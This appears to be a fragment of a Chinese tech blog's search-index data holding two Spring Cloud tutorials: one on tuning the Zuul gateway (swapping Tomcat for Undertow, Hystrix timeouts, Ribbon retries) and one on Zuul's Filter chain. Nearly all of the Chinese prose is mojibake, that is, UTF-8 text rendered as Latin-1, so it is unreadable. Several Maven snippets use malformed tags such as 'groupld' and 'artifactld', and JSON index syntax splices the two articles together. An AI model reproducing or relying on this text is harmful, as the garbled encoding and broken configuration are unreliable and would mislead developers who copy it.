ç»„ä»¶ä¼˜åŒ–ï¼šå†…éƒ¨é›†æˆçš„ç»„ä»¶ä¼˜åŒ–ï¼Œå¦‚ Hystrix çº¿ç¨‹éš”ç¦»ã€Ribbon. HttpClient ä¸ OkHttp é€‰æ‹© JVM å‚æ•°ä¼˜åŒ–ï¼šé€‚ç”¨äºç½‘å…³åº”ç”¨çš„ JVM å‚æ•°å»ºè®® å†…éƒ¨ä¼˜åŒ–ï¼šä¸€äº›å†…éƒ¨åŸç”Ÿå‚æ•°ï¼Œæˆ–è€…å†…éƒ¨æºç ï¼Œä»¥ä¸€ç§æ›´æ°å½“çš„æ–¹å¼é‡å†™å®ƒä»¬ å®¹å™¨ä¼˜åŒ–å…³äº Spring Boot ä¼˜åŒ–çš„æ–‡ç« ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šï¼Œä¸è¿‡å¤§éƒ¨åˆ†éƒ½ä¼šæåˆ°æŠŠé»˜è®¤çš„å†…åµŒå®¹å™¨ Tomcat æ›¿æ¢æˆ Undertowã€‚å…¶ä¸­ Undertow ç¿»è¯‘ä¸ºâ€ æš—æµâ€ï¼Œå³å¹³é™çš„æ¹–é¢ä¸‹æš—è—ç€æ³¢æ¶›æ±¹æ¶Œï¼Œæ‰€ä»¥ JBoss å…¬å¸å–å…¶æ„ï¼Œä¸ºå®ƒçš„è½»é‡çº§é«˜æ€§èƒ½å®¹å™¨å‘½åã€‚Undertow æä¾›é˜»å¡æˆ–åŸºäº XNIO çš„éé˜»å¡æœºåˆ¶ï¼Œå®ƒçš„åŒ…å¤§å°ä¸è¶³ 1MBï¼Œå†…åµŒæ¨¡å¼è¿è¡Œæ—¶çš„å †å†…å­˜å ç”¨åªæœ‰ 4MB å·¦å³ã€‚è¦ä½¿ç”¨ Undertow ï¼Œåªéœ€è¦åœ¨é…ç½®æ–‡ä»¶ä¸­ç§»é™¤ Tomcatï¼Œæ·»åŠ  Undertow çš„ä¾èµ– å³å¯ï¼š 123456789101112131415&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupld&gt;org.springframework.boot&lt;/groupld&gt; &lt;artifactld&gt;spring-boot-starter-tomcat&lt;/artifactld&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupld&gt;org.springframework.boot&lt;/groupld&gt; &lt;artifactld&gt;spring-boot-starter-undertow&lt;/artifactld&gt;&lt;/dependency&gt; Undertow çš„ä¸»è¦é…ç½®å‚æ•°å¦‚ä¸‹ï¼š ç»„ä»¶ä¼˜åŒ–åœ¨ Spring Cloud å¾®æœåŠ¡ä½“ç³»ä¸­ï¼ŒZuul æ˜¯ä¸€ä¸ªå®¹æ˜“è¢«å¿½ç•¥ä¼˜åŒ–ï¼Œä½†æ˜¯é›†æˆç»„ä»¶æœ€å¤šï¼ŒåŠŸèƒ½æœ€å¼ºå¤§çš„ç»„ä»¶ã€‚Zuul ç½‘å…³ä¸»è¦ç”¨äºæ™ºèƒ½è·¯ç”±ï¼ŒåŒæ—¶ä¹Ÿæ”¯æŒè®¤è¯ã€åŒºåŸŸå’Œå†…å®¹æ„ŸçŸ¥è·¯ç”±ï¼Œå°†å¤šä¸ªåº•å±‚æœåŠ¡èšåˆæˆç»Ÿä¸€çš„å¯¹å¤– APIã€‚æ‰€ä»¥è¦æ›´å¥½åœ°ä½¿ç”¨ Zuulï¼Œå°±å…ä¸äº†è¦å¯¹å®ƒé›†æˆçš„ç»„ä»¶è¿›è¡Œä¼˜åŒ–ï¼Œä½¿å®ƒå¯ä»¥æ›´å¥½åœ°æ”¯æ’‘æœåŠ¡é›†ç¾¤ã€‚ Hystrix ä¼˜åŒ–ç”±äº Zuul é»˜è®¤é›†æˆäº† Hystrix ç†”æ–­å™¨ï¼Œä½¿å¾—ç½‘å…³åº”ç”¨å…·æœ‰å¼¹æ€§ã€å®¹é”™çš„èƒ½åŠ›ã€‚ä½†æ˜¯å¦‚æœä½¿ç”¨ç¼ºçœçš„é…ç½®ï¼Œå¯èƒ½ä¼šé‡åˆ°ç§ç§é—®é¢˜ï¼Œå…¶ä¸­æœ€å¸¸è§çš„é—®é¢˜å°±æ˜¯å½“å¯åŠ¨ Zuul åº”ç”¨ä¹‹åï¼Œç¬¬ä¸€æ¬¡è¯·æ±‚å¾€å¾€ä¼šå¤±è´¥ã€‚æ ¹æœ¬åŸå› æ˜¯ Hystrix é»˜è®¤çš„è¶…æ—¶æ—¶é—´æ˜¯ 1 ç§’ï¼Œå¦‚æœè¶…è¿‡è¿™ä¸ªæ—¶é—´å°šæœªä½œå‡ºå“åº”ï¼Œå°†ä¼šè¿›å…¥ fallback ä»£ç ã€‚ç”±äºåœ¨å¤„ç†ç¬¬ä¸€æ¬¡è¯·æ±‚çš„æ—¶å€™ï¼ŒZuul å†…éƒ¨è¦åˆå§‹åŒ–å¾ˆå¤šç±»ä¿¡æ¯ï¼Œè¿™æ˜¯ååˆ†è€—æ—¶çš„ï¼Œå¦‚æœè¿™ä¸ªå“åº”æ—¶é—´è¶…è¿‡ 1 ç§’ï¼Œå°±ä¼šå‡ºç°è¯·æ±‚å¤±è´¥çš„é—®é¢˜ã€‚è§£å†³æ–¹å¼æœ‰ä»¥ä¸‹ä¸¤ç§ï¼š ç¦ç”¨ Hystrix çš„è¶…æ—¶æ—¶é—´ï¼š hystrix.command.default.execution.timeout.enabled=false åŠ å¤§ Hystrix çš„è¶…æ—¶æ—¶é—´ï¼š hystrix.command.default.execution.isolation.thread.timeoutInMilliseconds=5000 Zuul ä¸­å…³äº Hystrix çš„é…ç½®è¿˜æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„ç‚¹ï¼Œé‚£å°±æ˜¯ Hystrix çš„çº¿ç¨‹éš”ç¦»æ¨¡å¼çš„é€‰æ‹©ï¼ŒåŒ…æ‹¬çº¿ç¨‹æ± éš”ç¦»æ¨¡å¼ï¼ˆTHREADï¼‰æˆ–è€…ä¿¡å·é‡éš”ç¦»æ¨¡å¼ï¼ˆSEMAPHOREï¼‰ã€‚åœ¨ç½‘å…³ä¸­ï¼Œå¯¹èµ„æºçš„ä½¿ç”¨æ˜¯åº”è¯¥å—åˆ°ä¸¥æ ¼æ§åˆ¶çš„ï¼Œå¦‚æœä¸åŠ é™åˆ¶ï¼Œä¼šå¯¼è‡´èµ„æºæ»¥ç”¨ï¼Œåœ¨æ¶åŠ£çš„çº¿ä¸Šç¯å¢ƒä¸‹å°±å®¹æ˜“å¼•èµ·æœåŠ¡é›ªå´©ã€‚ä¸¤ç§éš”ç¦»æ¨¡å¼å¯¹æ¯”ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ Hystrix åˆ‡æ¢éš”ç¦»æ¨¡å¼çš„é…ç½®æ–¹å¼ï¼š 1hystrix.command.default.execution.isolation.strategy=Thread | Semaphore Hystrix éš”ç¦»æ¨¡å¼é€‰æ‹©æ€»ç»“ï¼Œå½“åº”ç”¨éœ€è¦ä¸å¤–ç½‘äº¤äº’ï¼Œç”±äºç½‘ç»œå¼€é”€æ¯”è¾ƒå¤§ä¸è¯·æ±‚æ¯”è¾ƒè€—æ—¶ï¼Œè¿™æ—¶é€‰ç”¨çº¿ç¨‹éš”ç¦»ç­–ç•¥ï¼Œå¯ä»¥ä¿è¯æœ‰å‰©ä½™çš„å®¹å™¨ï¼ˆTomcat &amp; Undertow &amp; Jettyï¼‰çº¿ç¨‹å¯ç”¨ï¼Œè€Œä¸ä¼šç”±äºå¤–éƒ¨åŸå› ä½¿å¾—çº¿ç¨‹ä¸€ç›´å¤„äºé˜»å¡æˆ–ç­‰å¾…çŠ¶æ€ï¼Œå¯ä»¥å¿«é€Ÿå¤±è´¥è¿”å›ã€‚ä½†å½“å¾®æœåŠ¡åº”ç”¨åªåœ¨å†…ç½‘äº¤äº’ï¼Œå¹¶ä¸”ä½“é‡æ¯”è¾ƒå¤§ï¼Œè¿™æ—¶ä½¿ç”¨ä¿¡å·é‡éš”ç¦»ç­–ç•¥å°±æ¯”è¾ƒå¥½ï¼Œå› ä¸ºè¿™ç±»åº”ç”¨çš„å“åº”é€šå¸¸ä¼šéå¸¸å¿«ï¼ˆç”±äºåœ¨å†…ç½‘ï¼‰ï¼Œä¸ä¼šå ç”¨å®¹å™¨çº¿ç¨‹å¤ªé•¿æ—¶é—´ï¼Œå¯ä»¥å‡å°‘çº¿ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢çš„å¼€é”€ï¼Œæé«˜åº”ç”¨è¿è½¬çš„æ•ˆç‡ï¼Œä¹Ÿå¯ä»¥èµ·åˆ°å¯¹è¯·æ±‚è¿›è¡Œå…¨å±€é™æµçš„ä½œç”¨ã€‚ Ribbon ä¼˜åŒ–è¿™é‡Œä¸»è¦æ˜¯è®² Ribbon çš„è¶…æ—¶é‡è¯•ä¼˜åŒ–ï¼Œåœ¨ Spring Cloud ä¸­æœ‰å¤šç§å‘é€ HTTP è¯·æ±‚çš„æ–¹å¼å¯ä»¥ä¸ Zuul ç»“åˆï¼ŒRestTemplateã€Ribbon æˆ–è€… Feignï¼Œä½†æ˜¯æ— è®ºé€‰æ‹©å“ªç§ï¼Œéƒ½å¯èƒ½å‡ºç°è¯·æ±‚å¤±è´¥çš„æƒ…å†µï¼Œè¿™åœ¨å¤æ‚çš„äº’è”ç½‘ç¯å¢ƒæ˜¯ä¸å¯é¿å…çš„ã€‚Zuul ä½œä¸ºä¸€ä¸ªç½‘å…³ä¸­é—´ä»¶ï¼Œåœ¨å‡ºç°å¶ç„¶è¯·æ±‚å¤±è´¥æ—¶è¿›è¡Œé€‚å½“çš„é‡è¯•æ˜¯ååˆ†å¿…è¦çš„ï¼Œé‡è¯•å¯ä»¥æœ‰æ•ˆåœ°é¿å…ä¸€äº›çªå‘åŸå› å¼•èµ·çš„è¯·æ±‚ä¸¢å¤±ã€‚Zuul ä¸­çš„é‡è¯•æœºåˆ¶æ˜¯é…åˆ Spring Retry ä¸ Ribbon æ¥ä½¿ç”¨çš„ã€‚ åœ¨ pom.xml å¼•å…¥ Spring Retry çš„ä¾èµ–åŒ…ï¼š 1234&lt;dependency&gt; &lt;groupld&gt;org.springframework.retry&lt;/groupld&gt; &lt;artifactld&gt;spring-retry&lt;/artifactld&gt;&lt;/dependency&gt; åœ¨ application.yml é‡Œæ·»åŠ é‡è¯•ç›¸å…³çš„é…ç½®å†…å®¹ï¼š 123456789101112131415161718#Zuulå¼€å¯é‡è¯•ï¼ŒDç‰ˆä¹‹åé»˜è®¤ä¸ºfalseï¼Œéœ€è¦æ‰‹åŠ¨å¼€å¯zuul: retryable: true#Ribbonçš„é‡è¯•æœºåˆ¶é…ç½®ribbon: ConnectTimeout: 3000 ReadTimeout: 60000 MaxAutoRetries: 1 #å¯¹ç¬¬ä¸€æ¬¡è¯·æ±‚çš„æœåŠ¡çš„é‡è¯•æ¬¡æ•° MaxAutoRetriesNextServer: 1 #è¦é‡è¯•çš„ä¸‹ä¸€ä¸ªæœåŠ¡çš„æœ€å¤§æ•°é‡ï¼ˆä¸åŒ…æ‹¬ç¬¬ä¸€ä¸ªæœåŠ¡ï¼‰ OkToRetryOnAllOperations: true#SpringCloudå†…éƒ¨é»˜è®¤å·²å¼€å¯è´Ÿè½½å‡è¡¡é‡è¯•ï¼Œè¿™é‡Œåˆ—å‡ºæ¥è¯´æ˜è¿™ä¸ªå‚æ•°æ¯”è¾ƒé‡è¦spring: cloud: loadbalancer: retry: enabled: true é…ç½®å½“ä¸­çš„ ConnectTimeout ä¸ ReadTimeou æ˜¯å½“ HTTP å®¢æˆ·ç«¯ä½¿ç”¨ Apache HttpClient çš„æ—¶å€™ç”Ÿæ•ˆçš„ï¼Œè¿™ä¸ªè¶…æ—¶æ—¶é—´æœ€ç»ˆä¼šè¢«è®¾ç½®åˆ° Apache HttpClient ä¸­å»ã€‚åœ¨è®¾ç½®çš„æ—¶å€™è¦ç»“åˆ Hystrix çš„è¶…æ—¶æ—¶é—´æ¥ç»¼åˆè€ƒè™‘ï¼Œé’ˆå¯¹ä¸åŒçš„åº”ç”¨åœºæ™¯ï¼Œè®¾ç½®å¤ªå°ä¼šå¯¼è‡´å¾ˆå¤šè¯·æ±‚å¤±è´¥ï¼Œè®¾ç½®å¤ªå¤§ä¼šå¯¼è‡´ç†”æ–­åŠŸèƒ½æ§åˆ¶æ€§å˜å·®ï¼Œæ‰€ä»¥éœ€è¦ç»è¿‡å‹åŠ›æµ‹è¯•å¾—æ¥ã€‚Zuul åŒæ—¶ä¹Ÿæ”¯æŒå¯¹å•ä¸ªæ˜ å°„è§„åˆ™è¿›è¡Œé‡è¯• zuul.routes.&lt;route&gt;.retryable=trueï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨æŸäº›å¯¹å¹‚ç­‰è¦æ±‚æ¯”è¾ƒé«˜çš„ä½¿ç”¨åœºæ™¯ä¸‹ï¼Œè¦æ…ç”¨é‡è¯•æœºåˆ¶ï¼Œå› ä¸ºå¦‚æœæ²¡æœ‰ç›¸å…³å¤„ç†çš„è¯ï¼Œå‡ºç°å¹‚ç­‰é—®é¢˜æ˜¯ååˆ†æœ‰å¯èƒ½çš„ã€‚ å†…éƒ¨ä¼˜åŒ–åœ¨å®˜æ–¹æ–‡æ¡£ä¸­ï¼ŒZuul éƒ¨åˆ†å¼€ç¯‡è®²äº† zuul.max.host.connections å±æ€§æ‹†è§£æˆäº† zuul.host.maxTotalConnectionsï¼ˆæœåŠ¡ HTTP å®¢æˆ·ç«¯æœ€å¤§è¿æ¥æ•°ï¼‰ä¸ zuul.host.maxPerRouteConnectionsï¼ˆæ¯ä¸ªè·¯ç”±è§„åˆ™ HTTP å®¢æˆ·ç«¯æœ€å¤§è¿æ¥æ•°ï¼‰ï¼Œé»˜è®¤å€¼åˆ†åˆ«ä¸º 200 ä¸ 20ï¼Œå¦‚æœä½¿ç”¨ Apache HttpClient çš„æ—¶å€™è¿™ä¸¤ä¸ªé…ç½®å‚æ•°åˆ™æœ‰æ•ˆï¼Œå¦‚æœä½¿ç”¨ OkHttp åˆ™æ— æ•ˆã€‚åœ¨ Zuul ä¸­è¿˜æœ‰ä¸€ä¸ªè¶…æ—¶æ—¶é—´ï¼Œä½¿ç”¨ serviceld æ˜ å°„ä¸ url æ˜ å°„çš„è®¾ç½®æ˜¯ä¸ä¸€æ ·çš„ï¼Œå¦‚æœä½¿ç”¨ serviceld æ˜ å°„ï¼Œribbon.ReadTimeout ä¸ ribbon.SocketTimeout ç”Ÿæ•ˆï¼›å¦‚æœä½¿ç”¨ url æ˜ å°„ï¼Œåº”è¯¥è®¾ç½® zuul.host.connect-timeout-millis ä¸ zuul.host.socket-timeout-millis å‚æ•°ã€‚ Zuul æºç è§£æï¼ˆå¾…ç»­ï¼‰ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"Zuul å…¥é—¨æ•™ç¨‹ - ä¸­çº§ç¯‡",url:"/posts/6f728f64.html",text:'ä¸Šç¯‡ - Zuul å…¥é—¨æ•™ç¨‹ï¼ˆåŸºç¡€ç¯‡ï¼‰ Zuul å…¥é—¨æ•™ç¨‹ - åŸºç¡€ç¯‡ å‰è¨€ç‰ˆæœ¬è¯´æ˜åœ¨æœ¬æ–‡ä¸­ï¼Œé»˜è®¤ä½¿ç”¨çš„ Spring Cloud ç‰ˆæœ¬æ˜¯ Finchley.RELEASEï¼Œå¯¹åº”çš„ Spring Boot ç‰ˆæœ¬æ˜¯ 2.0.3ï¼ŒZuul ç‰ˆæœ¬æ˜¯ 1.xï¼Œç‰¹åˆ«å£°æ˜é™¤å¤–ã€‚ Zuul Filter é“¾å·¥ä½œåŸç†Zuul çš„æ ¸å¿ƒé€»è¾‘æ˜¯ç”±ä¸€ç³»åˆ—ç´§å¯†é…åˆå·¥ä½œçš„ Filter æ¥å®ç°çš„ï¼Œå®ƒä»¬èƒ½å¤Ÿåœ¨è¿›è¡Œ HTTP è¯·æ±‚æˆ–è€…å“åº”çš„æ—¶å€™æ‰§è¡Œç›¸å…³æ“ä½œã€‚å¯ä»¥è¯´ï¼Œæ²¡æœ‰ Filter è´£ä»»é“¾ï¼Œå°±æ²¡æœ‰å¦‚ä»Šçš„ Zuulï¼Œæ›´ä¸å¯èƒ½æ„æˆåŠŸèƒ½ä¸°å¯Œçš„â€ ç½‘å…³ â€œï¼ŒZuul Filter çš„ä¸»è¦ç‰¹æ€§æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š Filter çš„ç±»å‹ï¼šFilter çš„ç±»å‹å†³å®šäº†æ­¤ Filter åœ¨ Filter é“¾ä¸­çš„æ‰§è¡Œé¡ºåºï¼Œå¯èƒ½æ˜¯è·¯ç”±åŠ¨ä½œå‘ç”Ÿå‰ï¼Œå¯èƒ½æ˜¯è·¯ç”±åŠ¨ä½œå‘ç”Ÿæ—¶ï¼Œå¯èƒ½æ˜¯è·¯ç”±åŠ¨ä½œå‘ç”Ÿåï¼Œä¹Ÿå¯èƒ½æ˜¯è·¯ç”±è¿‡ç¨‹å‘ç”Ÿå¼‚å¸¸æ—¶ Filter çš„æ‰§è¡Œé¡ºåºï¼šåŒä¸€ç§ç±»å‹çš„ Filter å¯ä»¥é€šè¿‡ filterOrder() æ–¹æ³•æ¥è®¾å®šæ‰§è¡Œé¡ºåºï¼Œä¸€èˆ¬ä¼šæ ¹æ®ä¸šåŠ¡çš„æ‰§è¡Œé¡ºåºéœ€æ±‚ï¼Œæ¥è®¾å®šè‡ªå®šä¹‰ Filter çš„æ‰§è¡Œé¡ºåº Filter çš„æ‰§è¡Œæ¡ä»¶ï¼šFilter è¿è¡Œæ‰€éœ€è¦çš„æ ‡å‡†æˆ–æ¡ä»¶ Filter çš„æ‰§è¡Œæ•ˆæœï¼šç¬¦åˆæŸä¸ª Filter æ‰§è¡Œæ¡ä»¶ï¼Œäº§ç”Ÿçš„æ‰§è¡Œæ•ˆæœ Zuul å†…éƒ¨æä¾›äº†ä¸€ä¸ªåŠ¨æ€è¯»å–ã€ç¼–è¯‘å’Œè¿è¡Œè¿™äº› Filter çš„æœºåˆ¶ï¼ŒFilter ä¹‹é—´ä¸ç›´æ¥é€šä¿¡ï¼Œåœ¨è¯·æ±‚çº¿ç¨‹ä¸­ä¼šé€šè¿‡ RequestContext æ¥å…±äº«çŠ¶æ€ï¼Œå®ƒçš„å†…éƒ¨æ˜¯ç”¨ ThreadLocal å®ç°çš„ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥åœ¨ Filter ä¹‹é—´ä½¿ç”¨ ThreadLocal æ¥æ”¶é›†è‡ªå·±éœ€è¦çš„çŠ¶æ€æˆ–æ•°æ®ã€‚Zuul ä¸­ä¸åŒç±»å‹ Filter çš„æ‰§è¡Œé€»è¾‘æ ¸å¿ƒåœ¨ com.netflix.zuul.http.ZuulServlet ç±»ä¸­å®šä¹‰ï¼Œè¯¥ç±»ç›¸å…³ä»£ç å’Œå®˜æ–¹æµç¨‹å›¾å¦‚ä¸‹æ‰€ç¤ºï¼š 12345678910111213141516171819202122232425262728293031try { this.init((HttpServletRequest)servletRequest, (HttpServletResponse)servletResponse); RequestContext context = RequestContext.getCurrentContext(); context.setZuulEngineRan(); try { this.preRoute(); } catch (ZuulException var13) { this.error(var13); this.postRoute(); return; } try { this.route(); } catch (ZuulException var12) { this.error(var12); this.postRoute(); return; } try { this.postRoute(); } catch (ZuulException var11) { this.error(var11); }} catch (Throwable var14) { this.error(new ZuulException(var14, 500, "UNHANDLED_EXCEPTION_" + var14.getClass().getName()));} finally { RequestContext.getCurrentContext().unset();} ä¸Šé¢çš„å®˜æ–¹æµç¨‹å›¾æœ‰äº›é—®é¢˜ï¼Œå…¶ä¸­ Post Filter æŠ›é”™ä¹‹åè¿›å…¥ Error Filterï¼Œç„¶åå†è¿›å…¥ Post Filter æ˜¯æœ‰å¤±åé¢‡çš„ã€‚å®é™…ä¸Š Post Filter æŠ›é”™åˆ†ä¸¤ç§æƒ…å†µï¼š åœ¨ Post Filter æŠ›é”™ä¹‹å‰ï¼ŒPreã€Route Filter æ²¡æœ‰æŠ›é”™ï¼Œæ­¤æ—¶ä¼šè¿›å…¥ ZuulException çš„é€»è¾‘ï¼Œæ‰“å°å †æ ˆä¿¡æ¯ï¼Œç„¶åå†è¿”å› status = 500 çš„ Error ä¿¡æ¯ åœ¨ Post Filter æŠ›é”™ä¹‹å‰ï¼ŒPreã€Route Filter å·²æœ‰æŠ›é”™ï¼Œæ­¤æ—¶ä¸ä¼šæ‰“å°å †æ ˆä¿¡æ¯ï¼Œç›´æ¥è¿”å› status = 500 çš„ Error ä¿¡æ¯ ä¹Ÿå°±æ˜¯è¯´ï¼Œæ•´ä¸ªè´£ä»»é“¾æµç¨‹ç»ˆç‚¹ä¸åªæ˜¯ Post Filterï¼Œè¿˜å¯èƒ½æ˜¯ Error Filterï¼Œé‡æ–°æ•´ç†åçš„æµç¨‹å›¾ Filter çš„ç”Ÿå‘½å‘¨æœŸZuul ä¸€å…±æœ‰å››ç§ä¸åŒç”Ÿå‘½å‘¨æœŸçš„ Filterï¼Œåˆ†åˆ«æ˜¯ï¼š preï¼šåœ¨ Zuul æŒ‰ç…§æ˜ å°„è§„åˆ™è·¯ç”±åˆ°ä¸‹çº§æœåŠ¡ä¹‹å‰æ‰§è¡Œï¼Œå¦‚æœéœ€è¦å¯¹è¯·æ±‚è¿›è¡Œé¢„å¤„ç†ï¼Œæ¯”å¦‚é‰´æƒã€é™æµç­‰ï¼Œéƒ½åº”è€ƒè™‘åœ¨æ­¤ç±» Filter é‡Œå®ç° routeï¼šè¿™ç±» Filter æ˜¯ Zuul è·¯ç”±åŠ¨ä½œçš„æ‰§è¡Œè€…ï¼Œæ˜¯ Apache HttpClient æˆ– Netflix Ribbon æ„å»ºå’Œå‘é€åŸå§‹ HTTP è¯·æ±‚çš„åœ°æ–¹ï¼Œç›®å‰å·²æ”¯æŒ OkHttp postï¼šè¿™ç±» Filter æ˜¯åœ¨æºæœåŠ¡è¿”å›ç»“æœæˆ–è€…å¼‚å¸¸ä¿¡æ¯å‘ç”Ÿåæ‰§è¡Œçš„ï¼Œå¦‚æœéœ€è¦å¯¹è¿”å›ä¿¡æ¯åšä¸€äº›å¤„ç†ï¼Œåˆ™åœ¨æ­¤ç±» Filter è¿›è¡Œå¤„ç† errorï¼šåœ¨æ•´ä¸ªç”Ÿå‘½å‘¨æœŸå†…å¦‚æœå‘ç”Ÿå¼‚å¸¸ï¼Œåˆ™ä¼šè¿›å…¥ Error Filterï¼Œå¯åšå…¨å±€å¼‚å¸¸å¤„ç† åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œå¾€å¾€éœ€è¦è‡ªå®ç°ä»¥ä¸Šç±»å‹çš„ Filter æ¥å¯¹è¯·æ±‚é“¾è·¯è¿›è¡Œå¤„ç†ï¼Œæ ¹æ®ä¸šåŠ¡çš„éœ€æ±‚ï¼Œé€‰å–ç›¸åº”ç”Ÿå‘½å‘¨æœŸçš„ Filter æ¥è¾¾æˆç›®çš„ã€‚åœ¨ Filter ä¹‹é—´ï¼Œé€šè¿‡ com.netflix.zuul.context. RequestContext ç±»æ¥è¿›è¡Œé€šä¿¡ï¼Œå†…éƒ¨é‡‡ç”¨ ThreadLocal ä¿å­˜æ¯ä¸ªè¯·æ±‚çš„ä¸€äº›ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¯·æ±‚è·¯ç”±ã€é”™è¯¯ä¿¡æ¯ã€HttpServletRequestã€HttpServletResponseï¼Œè¿™ä½¿å¾—ä¸€äº›æ“ä½œæ˜¯ååˆ†å¯é çš„ï¼Œå®ƒè¿˜æ‰©å±•äº† ConcurrentHashMapï¼Œç›®çš„æ˜¯ä¸ºäº†åœ¨å¤„ç†è¿‡ç¨‹ä¸­ä¿å­˜ä»»ä½•å½¢å¼çš„ä¿¡æ¯ã€‚ Zuul çš„åŸç”Ÿ Filteré¦–å…ˆå®˜æ–¹æ–‡æ¡£æåˆ°ï¼ŒZuul Server å¦‚æœä½¿ç”¨ @EnableZuulProxy æ³¨è§£æ­é… Spring Boot Actuatorï¼Œä¼šå¤šå‡ºä¸¤ä¸ªç®¡æ§ç«¯ç‚¹ï¼Œå…·ä½“é…ç½®å¦‚ä¸‹ï¼š 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; 123456# æš´éœ²æ‰€éœ€çš„ç«¯ç‚¹management: endpoints: web: exposure: include: health, info, routes, filters ç«¯ç‚¹ /actuatorï¼ŒæŸ¥çœ‹æˆªå›¾ ç«¯ç‚¹ /filtersï¼šè¿”å›å½“å‰ Zuul Server ä¸­æ‰€æœ‰å·²æ³¨å†Œç”Ÿæ•ˆçš„ Filterï¼ŒæŸ¥çœ‹æˆªå›¾ ç«¯ç‚¹ /routesï¼šè¿”å›å½“å‰ Zuul Server ä¸­æ‰€æœ‰å·²ç”Ÿæˆçš„æ˜ å°„è§„åˆ™ï¼ŒåŠ ä¸Š /details å¯æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ï¼ŒæŸ¥çœ‹æˆªå›¾ ä»ç«¯ç‚¹ /filters è¿”å›çš„æ•°æ®å¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ°æ‰€æœ‰å·²æ³¨å†Œç”Ÿæ•ˆçš„ Filter ä¿¡æ¯ï¼ŒåŒ…æ‹¬ï¼šFilter å®ç°ç±»è·¯å¾„ã€Filter æ‰§è¡Œæ¬¡åºã€æ˜¯å¦è¢«ç¦ç”¨ã€æ˜¯å¦é™æ€ã€‚æ ¹æ®è¿”å›çš„å†…å®¹ï¼Œå°†å‰é¢çš„å›¾ç¨ä½œæ‰©å±•ï¼Œå³å¯å¾—åˆ° Zuul å†…ç½® Filter ä¸ç”Ÿå‘½å‘¨æœŸçš„ç»„åˆæµç¨‹å›¾ ã€‚ Zuul å†…ç½®äº†å„ç§ Filterï¼ˆè§ä¸Šè¡¨ï¼‰ï¼Œä»¥ä¸Šæ˜¯ä½¿ç”¨ @EnableZuulProxy æ³¨è§£åæ³¨å†Œçš„ Filterï¼Œå¦‚æœä½¿ç”¨ @EnableZuulServer å°†ç¼ºå°‘ PreDecorationFilterã€RibbonRoutingFilterã€SimpleHostRoutingFilter è¿™äº›åŸç”Ÿ Filterã€‚å¦‚æœæœ‰ç‰¹æ®Šçš„ä¸šåŠ¡éœ€æ±‚ï¼Œå¯ä»¥é‡‡å–æ›¿ä»£å®ç°çš„æ–¹å¼ï¼Œè¦†ç›–æ‰å…¶åŸç”Ÿä»£ç ï¼Œä¹Ÿå¯ä»¥é‡†å–ç¦ç”¨ç­–ç•¥ï¼Œè¯­æ³•å¦‚ä¸‹ï¼šzuul.&lt;SimpleClassName&gt;.&lt;filterType&gt;.disable=true å¤šçº§ä¸šåŠ¡å¤„ç†è‡ªå®šä¹‰ Filteråœ¨ Zuul çš„ Filter é“¾ä½“ç³»ä¸­ï¼Œå¯ä»¥æŠŠä¸€ç»„ä¸šåŠ¡é€»è¾‘ç»†åˆ†ï¼Œç„¶åå°è£…åˆ°ä¸€ä¸ªä¸ªç´§å¯†ç»“åˆçš„ Filter ä¸­ï¼Œè®¾ç½®å¤„ç†é¡ºåºï¼Œç»„æˆä¸€ç»„ Filter é“¾ã€‚è¿™åœ¨ä¸€äº›ä¸šåŠ¡åœºæ™¯ä¸‹ååˆ†å®ç”¨ï¼Œä»¥è‡´é™¤ Zuul ä»¥å¤–çš„ç½‘å…³ä¸­é—´ä»¶å‡ ä¹éƒ½æœ‰ç±»ä¼¼çš„å®ç°ã€‚åœ¨ Zuul é‡Œå®ç°è‡ªå®šä¹‰ Filterï¼Œåªéœ€ç»§æ‰¿ ZuulFilter ç±»å³å¯ï¼ŒZuulFilter æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œéœ€è¦å®ç°å®ƒçš„ä»¥ä¸‹å‡ ä¸ªæ–¹æ³•ï¼š String filterType ()ï¼šä½¿ç”¨è¿”å›å€¼è®¾å®š Filter ç±»å‹ï¼Œå¯ä»¥è®¾ç½®ä¸º preã€routeã€postã€error ç±»å‹ã€‚ int filterOrder ()ï¼šä½¿ç”¨è¿”å›å€¼è®¾å®š Filter æ‰§è¡Œæ¬¡åº boolean shouldFilter ()ï¼šä½¿ç”¨è¿”å›å€¼è®¾å®šè¯¥ Filter æ˜¯å¦æ‰§è¡Œï¼Œå¯ä»¥ä½œä¸ºå¼€å…³æ¥ä½¿ç”¨ Object run ()ï¼šFilter é‡Œé¢çš„æ ¸å¿ƒæ‰§è¡Œé€»è¾‘ï¼Œä¸šåŠ¡å¤„ç†åœ¨æ­¤ç¼–å†™ åœ¨ Zuul é‡Œè‡ªå®šä¹‰ Filter çš„ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 